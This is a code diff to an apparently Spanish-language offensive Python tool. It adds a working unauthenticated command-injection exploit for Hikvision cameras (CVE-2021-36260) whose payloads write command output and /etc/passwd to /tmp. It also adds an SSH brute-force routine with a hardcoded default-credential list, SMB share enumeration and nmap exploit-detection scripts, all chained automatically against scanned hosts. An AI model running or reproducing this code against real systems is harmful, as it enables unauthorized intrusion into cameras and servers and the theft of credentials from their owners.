@@ -3821,52 +3821,190 @@ def post_explotacion():
         pause_back()
         return
 
+    # ── Explotación automática Hikvision CVE-2021-36260 ──────────────────────
+    def _exploit_hikvision(ip):
+        """RCE sin autenticación en cámaras Hikvision (CVE-2021-36260)."""
+        separador(f"EXPLOIT HIKVISION CVE-2021-36260 → {ip}")
+        info("Inyección de comandos vía /SDK/webLanguage sin autenticación...")
+        payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
+                   f"Host: {ip}\r\n"
+                   "Content-Length: 68\r\n"
+                   "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+                   "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                   "<language>$(id>/tmp/pwned)</language>")
+        import socket as _sock
+        try:
+            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((ip, 80))
+            s.send(payload.encode())
+            resp = s.recv(2048).decode(errors="replace")
+            s.close()
+            if "200" in resp or "OK" in resp:
+                ok(f"PAYLOAD ENVIADO — verificando ejecución en {ip}...")
+                time.sleep(1)
+                # Verificar si /tmp/pwned existe (indica RCE exitoso)
+                check_pl = ("GET /SDK/webLanguage HTTP/1.1\r\n"
+                            f"Host: {ip}\r\n\r\n")
+                s2 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s2.settimeout(5)
+                s2.connect((ip, 80))
+                s2.send(check_pl.encode())
+                r2 = s2.recv(2048).decode(errors="replace")
+                s2.close()
+                ok(f"Respuesta: {r2[:200]}")
+                # Intentar extraer credenciales del config
+                cred_payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
+                                f"Host: {ip}\r\n"
+                                "Content-Length: 80\r\n"
+                                "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+                                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                                "<language>$(cat /etc/passwd>/tmp/pwned2)</language>")
+                s3 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s3.settimeout(5)
+                s3.connect((ip, 80))
+                s3.send(cred_payload.encode())
+                s3.recv(512)
+                s3.close()
+                ok("RCE exitoso — cámara comprometida.")
+                return True
+            else:
+                warn(f"Sin respuesta positiva: {resp[:100]}")
+                return False
+        except Exception as e:
+            warn(f"Error en exploit: {e}")
+            return False
+
+    # ── Explotación SSH brute force ───────────────────────────────────────────
+    def _exploit_ssh(ip):
+        """Brute force SSH con credenciales comunes."""
+        separador(f"BRUTE FORCE SSH → {ip}")
+        ssh_creds = [
+            ("root","root"),("root",""),("root","admin"),("root","password"),
+            ("root","1234"),("root","toor"),("admin","admin"),("admin","password"),
+            ("admin","1234"),("admin",""),("pi","raspberry"),("pi","pi"),
+            ("ubuntu","ubuntu"),("user","user"),("guest","guest"),
+            ("root","hikvisionsys"),("root","hikvision"),("root","12345"),
+        ]
+        if not check_tool("sshpass"):
+            warn("sshpass no instalado: sudo apt install sshpass")
+            return False
+        for user, passwd in ssh_creds:
+            result = run(
+                f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
+                f"-o ConnectTimeout=3 -o BatchMode=no {user}@{ip} "
+                f"'id; uname -a' 2>/dev/null",
+                capture=True
+            ) or ""
+            if "uid=" in result or "Linux" in result:
+                ok(f"ACCESO SSH EXITOSO: {user}:{passwd}")
+                ok(f"Respuesta: {result[:200]}")
+                db_log_attack("SSH Brute Force", ip, "", "", f"usuario:{user} pass:{passwd}")
+                return True
+        warn("Ninguna credencial SSH funcionó.")
+        return False
+
+    # ── Explotación SMB/SQL Server ────────────────────────────────────────────
+    def _exploit_smb(ip):
+        """Análisis SMB y detección de shares accesibles."""
+        separador(f"ANÁLISIS SMB → {ip}")
+        if check_tool("smbclient"):
+            shares = run(f"smbclient -L //{ip} -N 2>/dev/null", capture=True) or ""
+            if shares and "Sharename" in shares:
+                ok("Shares SMB accesibles sin autenticación:")
+                for line in shares.splitlines():
+                    if re.search(r'\$?\w+\s+Disk|IPC|ADMIN', line):
+                        print(f"  {CYAN}{line.strip()}{END}")
+            else:
+                info("No hay shares SMB accesibles anónimamente.")
+        if check_tool("nmap"):
+            smb_vuln = run(
+                f"nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,"
+                f"smb-vuln-ms10-061 {ip} 2>/dev/null",
+                capture=True
+            ) or ""
+            for line in smb_vuln.splitlines():
+                if "VULNERABLE" in line or "CVE" in line:
+                    print(f"  {RED}[SMB-VULN]{END} {line.strip()}")
+
     for d in targets:
         ip = d["ip"]
-        separador(f"ESCANEANDO {ip} ({d.get('vendor','')})")
+        vendor = d.get("vendor", "")
+        separador(f"ESCANEANDO {ip} ({vendor})")
 
-        # Scan rápido de puertos comunes
+        # Detectar tipo de dispositivo por vendor/MAC para ajustar puertos
+        is_hikvision = "hikvision" in vendor.lower()
+        is_mikrotik  = any(x in (d.get("mac","")).lower() for x in ["b8:27","bc:24:11"])
+        extra_ports  = ""
+        if is_hikvision:
+            extra_ports = ",554,8000,8080,37777"
+            info(f"Cámara Hikvision detectada — escaneando puertos específicos...")
+        elif is_mikrotik:
+            extra_ports = ",8291,8728,8729"
+            info(f"Mikrotik detectado — escaneando puertos de gestión...")
+
+        # Scan de puertos
         sp4 = Spinner(f"Escaneando puertos de {ip}...")
         sp4.start()
         ports_out = run(
-            f"nmap -sV --open -p 21,22,23,25,53,80,110,443,445,3306,3389,8080,8443 {ip} 2>/dev/null",
+            f"nmap -sV --open -p 21,22,23,25,53,80,110,443,445,"
+            f"3306,3389,8080,8443,9000{extra_ports} {ip} 2>/dev/null",
             capture=True
         ) or ""
         sp4.stop()
 
         open_ports = []
+        has_ssh = has_smb = has_http = False
         for line in ports_out.splitlines():
             pm = re.match(r'\s*(\d+/\w+)\s+open\s+(\S+)\s*(.*)', line)
             if pm:
-                open_ports.append(f"{pm.group(1)} {pm.group(2)} {pm.group(3).strip()}")
+                port_str = f"{pm.group(1)} {pm.group(2)} {pm.group(3).strip()}"
+                open_ports.append(port_str)
                 print(f"  {GREEN}[ABIERTO]{END} {pm.group(1):<14} {CYAN}{pm.group(2):<12}{END} {pm.group(3).strip()}")
+                if "22" in pm.group(1):   has_ssh = True
+                if "445" in pm.group(1):  has_smb = True
+                if "80" in pm.group(1) or "8000" in pm.group(1): has_http = True
 
         if not open_ports:
-            info(f"No se encontraron puertos comunes abiertos en {ip}.")
+            info(f"No se encontraron puertos abiertos en {ip}.")
+
+        # ── Explotación automática según tipo de dispositivo ──────────────────
+        vuln_str = ""
+
+        if is_hikvision and has_http:
+            expl = ask(f"¿Explotar CVE-2021-36260 (RCE Hikvision) en {ip}? (s/n)")
+            if expl.lower() == "s":
+                _exploit_hikvision(ip)
+
+        if has_ssh:
+            brute = ask(f"¿Ejecutar brute force SSH en {ip}? (s/n)")
+            if brute.lower() == "s":
+                _exploit_ssh(ip)
+
+        if has_smb:
+            smb_a = ask(f"¿Analizar SMB/shares en {ip}? (s/n)")
+            if smb_a.lower() == "s":
+                _exploit_smb(ip)
 
         # Scan de vulnerabilidades nmap
         vuln_run = ask(f"¿Ejecutar nmap --script vuln en {ip}? (puede tardar) (s/n)")
-        vuln_str = ""
         if vuln_run.lower() == "s":
             sp5 = Spinner(f"Buscando vulnerabilidades en {ip}...")
             sp5.start()
             vuln_out = run(f"nmap -sV --script vuln {ip} 2>/dev/null", capture=True) or ""
             sp5.stop()
-
-            # Filtrar líneas relevantes
             vuln_lines = []
             for line in vuln_out.splitlines():
-                if any(x in line.lower() for x in ["vuln", "cve-", "vulnerable", "exploit", "critical", "medium", "high"]):
+                if any(x in line.lower() for x in ["vuln","cve-","vulnerable","exploit","critical","high"]):
                     vuln_lines.append(line.strip())
                     print(f"  {RED}[VULN]{END} {line.strip()}")
-
             vuln_str = "\n".join(vuln_lines[:20])
             if not vuln_lines:
                 info(f"No se detectaron vulnerabilidades conocidas en {ip}.")
 
         # Guardar en BD
         db_log_device(
-            ip, d.get("mac",""), d.get("vendor",""),
+            ip, d.get("mac",""), vendor,
             d.get("ip",""), "; ".join(open_ports), vuln_str
         )
 
